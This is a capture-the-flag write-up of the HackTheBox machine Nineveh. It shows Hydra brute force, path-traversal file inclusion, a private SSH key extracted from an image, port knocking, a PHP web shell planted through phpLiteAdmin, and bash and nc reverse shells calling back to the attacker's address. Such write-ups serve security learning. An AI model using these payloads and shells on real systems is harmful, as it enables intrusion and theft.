---
permalink: /posts/HTB/Nineveh
title:  "HTB Nineveh"
author: Luc Kolen
description: "Nineveh is a medium Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Medium
  - Linux
  - Hydra
  - Local file inclusion
  - Knockd
  - phpLiteAdmin
  - Steganography
---
# 10.10.10.43 - Nineveh

- [10.10.10.43 - Nineveh](#10101043---nineveh)
  - [Open ports](#open-ports)
  - [SSL Certificate shows hostname](#ssl-certificate-shows-hostname)
  - [Gobuster](#gobuster)
    - [HTTP](#http)
    - [HTTPS](#https)
  - [HTTP department page](#http-department-page)
    - [Login brute force](#login-brute-force)
    - [Local file inclusion](#local-file-inclusion)
  - [HTTPS Secure_notes image](#https-secure_notes-image)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)
  - [Bonus](#bonus)
    - [Department login bypass](#department-login-bypass)
    - [phpLiteAdmin](#phpliteadmin)
      - [Login brute force](#login-brute-force-1)
      - [Shell](#shell)
    - [Binwalk to extract data from image](#binwalk-to-extract-data-from-image)
    - [Alternative path to ports to knock](#alternative-path-to-ports-to-knock)

## Open ports

```bash
luc@kali:~/HTB/Nineveh$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.43
```

|Port|Service|Version
|---|---|---|
tcp/80|http|Apache httpd 2.4.18 ((Ubuntu))
tcp/443|ssl/http|Apache httpd 2.4.18 ((Ubuntu))

## SSL Certificate shows hostname

The SSL certificate shows information about the website and who created this certificate

```text
Subject: /C=GR/ST=Athens/L=Athens/O=HackTheBox Ltd/OU=Support/CN=nineveh.htb/emailAddress=admin@nineveh.htb
```

We now know that the hostname is `nineveh.htb` and that `admin@nineveh.htb` is a valid email address.

## Gobuster

We get different pages when browsing `http://nineveh.htb` and `https://nineveh.htb` so we'll run Gobuster on both.

### HTTP

```bash
luc@kali:~/HTB/Nineveh$ gobuster dir -u http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
...
/department (Status: 301)
...
```

Navigating to `http://nineveh.htb/department` shows a login page

### HTTPS

```bash
luc@kali:~/HTB/Nineveh$ gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
...
/db (Status: 301)
...
/secure_notes (Status: 301)
...
```

Navigating to `https://nineveh.htb/db` shows the login for `phpLiteAdmin v1.9`, but the default password `admin` doesn't work.

Navigating to `https://nineveh.htb/secure_notes` shows an image.

## HTTP department page

### Login brute force

We don't have any credentials so we'll need to brute force this login. Using username `admin` and password `admin` shows the message `Invalid Password!` and username `FakeUser` shows the message `invalid username`.

```bash
luc@kali:~/HTB/Nineveh$ hydra nineveh.htb http-form-post "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
...
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
...
```

### Local file inclusion

As a logged in user we can view notes.

```http
GET /department/manage.php?notes=files/ninevehNotes.txt HTTP/1.1

Have you fixed the login page yet! hardcoded username and password is really bad idea!
check your serect folder to get in! figure it out! this is your challenge
Improve the db interface.
~amrois
```

This notes parameter controls what file will be shown on the page so lets play around with that.

Removing the content `files/ninevehNotes` will result in the `No Note is selected.` message from the page, but we can bypass this check by adding our path payload after this path.

```http
GET /department/manage.php?notes=files/ninevehNotes/../../../../../../etc/passwd HTTP/1.1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
```

Amrois was the one who wrote the note on the webpage and is also now confirmed as a user on the machine. We can try reading its mail by opening `/var/mail/amrois`.

```http
GET /department/manage.php?notes=files/ninevehNotes/../../../../../../var/mail/amrois HTTP/1.1

From root@nineveh.htb  Fri Jun 23 14:04:19 2017
Return-Path: <root@nineveh.htb>
X-Original-To: amrois
Delivered-To: amrois@nineveh.htb
Received: by nineveh.htb (Postfix, from userid 1000)
        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
To: amrois@nineveh.htb
From: root@nineveh.htb
Subject: Another Important note!
Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)

Amrois! please knock the door next time! 571 290 911
```

This email could be a reference to [Port Knocking](https://wiki.archlinux.org/index.php/Port_knocking) where a port on the machine only opens after other ports have been knocked in the correct sequence, `571` `290` `911`.

## HTTPS Secure_notes image

This image probably hides some important information so we'll need to download it.

```bash
luc@kali:~/HTB/Nineveh$ mkdir images
luc@kali:~/HTB/Nineveh$ cd images/
luc@kali:~/HTB/Nineveh/images$ wget https://nineveh.htb/secure_notes/nineveh.png --no-check-certificate
```

We can use the `strings` command to see if there is any hidden text data in the image

```bash
luc@kali:~/HTB/Nineveh/images$ strings nineveh.png
...
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
...
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
...
```

This looks like the private SSH key for `amrois@nineveh.htb`, we can try using this key to login.

```bash
luc@kali:~/HTB/Nineveh/images$ echo -n '-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----' > amrois.key
luc@kali:~/HTB/Nineveh/images$ chmod 600 amrois.key
luc@kali:~/HTB/Nineveh/images$ ssh -i amrois.key amrois@nineveh.htb
ssh: connect to host nineveh.htb port 22: Connection timed out
```

As expected the SSH port is closed (otherwise it would have shown as open during the NMAP scan). We'll probably need the port knocking sequence we found earlier in `/var/mail/amrois`, `571` `290` `911`.

```bash
luc@kali:~/HTB/Nineveh/images$ knock 10.10.10.43 571:tcp 290:tcp 911:tcp
luc@kali:~/HTB/Nineveh/images$ ssh -i amrois.key amrois@10.10.10.43
amrois@nineveh:~$ cat user.txt
82a864f*************************
```

## Privilege escalation

```bash
luc@kali:~/HTB/Nineveh$ cp /opt/pspy-binaries/pspy32 .
luc@kali:~/HTB/Nineveh$ python3 -m http.server
```

```bash
amrois@nineveh:/tmp$ wget http://10.10.14.16:8000/pspy32
amrois@nineveh:/tmp$ chmod +x pspy32
amrois@nineveh:/tmp$ ./pspy32
...
CMD: UID=0    PID=11138  | /bin/sh /usr/bin/chkrootkit
...
```

Chkrootkit is executed as root and this application has a known privilege escalation

```bash
luc@kali:~/HTB/Nineveh$ searchsploit chkrootkit
...
Chkrootkit 0.49 - Local Privilege Escalation | linux/local/33899.txt
...
```

Chkrootkit executes the file /tmp/update as root if /tmp isn't mounted as noexec.

```bash
amrois@nineveh:/tmp$ echo '#!/bin/bash
>
> bash -i >& /dev/tcp/10.10.14.16/443 0>&1' > update
amrois@nineveh:/tmp$ chmod +x update
```

```bash
luc@kali:~/HTB/Nineveh$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.43.
Ncat: Connection from 10.10.10.43:50624.
bash: cannot set terminal process group (17369): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# cat /root/root.txt
8a2b495*************************
```

## TL;DR

- Gobuster to find pages on `http:80` and `https:443`
- Brute force login to: `http://nineveh.htb/department`
- Use local file inclusion on `http://nineveh.htb/department` to find order of ports to knock
- Download image shown on `https://nineveh.htb/secure_notes` and extract private key used for SSH
- Knock ports and use private key file to gain access as amrois
- Use vulnerability in chkrootkit to get root

## Bonus

This wasn't used during initial exploitation, but could've been useful or provided another path.

### Department login bypass

During the original exploitation Hydra was used to brute force the password. It turns out that this login page was vulnerable to a PHP exploit by changing the data type of the password.

Original request

```http
POST /department/login.php HTTP/1.1
...

username=admin&password=test
```

Request edited in Burp Suite

```http
POST /department/login.php HTTP/1.1
...

username=admin&password[]=
```

Changing the parameter from `password` to `password[]` will change the datatype to an `array`. The `strcmp` function in PHP is used to compare two `string` values and return the first index of the character where the strings are different. If one of the parameters in this function is an `array` it will throw a warning, but continue execution and return `NULL`. If only the values and not the types are compared in PHP this `NULL` will equal `0` so the output of the function if both `string` parameters in `strcmp` match.

Doing this this way would've resulted in a part from start to root without any brute forcing.

### phpLiteAdmin

This solution found, but ignored phpLiteAdmin because another solution was found.

#### Login brute force

We'll use Hydra to brute force the login tot phpLiteAdmin, just like we did to the department login page. The hydra command will have `-l user`, because we have to set the `-l` parameter even when it's not used.

```bash
luc@kali:~/HTB/Nineveh$ hydra nineveh.htb https-form-post "/db/index.php:password=^PASS^&proc_login=true:Incorrect password" -l user -P /usr/share/wordlists/rockyou.txt -vV -f
...
[443][http-post-form] host: nineveh.htb   login: user   password: password123
...
```

#### Shell

To create a shell we first need to create a database named {something}.php, in this case `shell.php`.

![Create database](/assets/images/HTB-Nineveh/1.a%20Create%20database.png)

Create a new table named {something} with one field, in this case `shell`.

![Create table](/assets/images/HTB-Nineveh/1.b%20Create%20table.png)

Name of the field doesn't matter, type has to be set to text and default value will be the PHP code

```php
<?php system($_GET["cmd"]);?>
```

We can use the local file inclusion to verify that our code is executed

```http
GET /department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/shell.php&cmd=whoami HTTP/1.1

SQLite format 3@  -�
��b�#tableshellshellCREATE TABLE 'shell' ('field' TEXT default 'www-data
')

```

We can also use this to start a reverse shell

```http
GET /department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/shell.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.16+444+>/tmp/f HTTP/1.1
```

```bash
luc@kali:~/HTB/Nineveh$ sudo nc -lnvp 444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.43.
Ncat: Connection from 10.10.10.43:50020.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This `www-data` user also could've done the privilege escalation by placing the `/tmp/update` file.

### Binwalk to extract data from image

Instead of manually looking trough the output of the strings command on the image we could've used Binwalk with the `-Me` parameters. `M` to recursively scan extracted files and `e` to extract files.

```bash
luc@kali:~/HTB/Nineveh/images$ binwalk -Me nineveh.png

Scan Time:     2020-06-11 15:46:46
Target File:   /home/luc/HTB/Nineveh/images/nineveh.png
MD5 Checksum:  353b8f5a4578e4472c686b6e1f15c808
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)


Scan Time:     2020-06-11 15:46:46
Target File:   /home/luc/HTB/Nineveh/images/_nineveh.png.extracted/54
MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Scan Time:     2020-06-11 15:46:46
Target File:   /home/luc/HTB/Nineveh/images/_nineveh.png.extracted/secret/nineveh.priv
MD5 Checksum:  f426d661f94b16292efc810ebb7ea305
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PEM RSA private key


Scan Time:     2020-06-11 15:46:46
Target File:   /home/luc/HTB/Nineveh/images/_nineveh.png.extracted/secret/nineveh.pub
MD5 Checksum:  6b60618d207ad97e76664174e805cfda
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             OpenSSH RSA public key
```

### Alternative path to ports to knock

Knockd configuration file is stored in `/etc/knockd.conf` this file could be included via the LFI, this file could also be found via the shell gained in the phpLiteAdmin exploit.

```http
GET /department/manage.php?notes=files/ninevehNotes/../../../../../../etc/knockd.conf HTTP/1.1

[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```
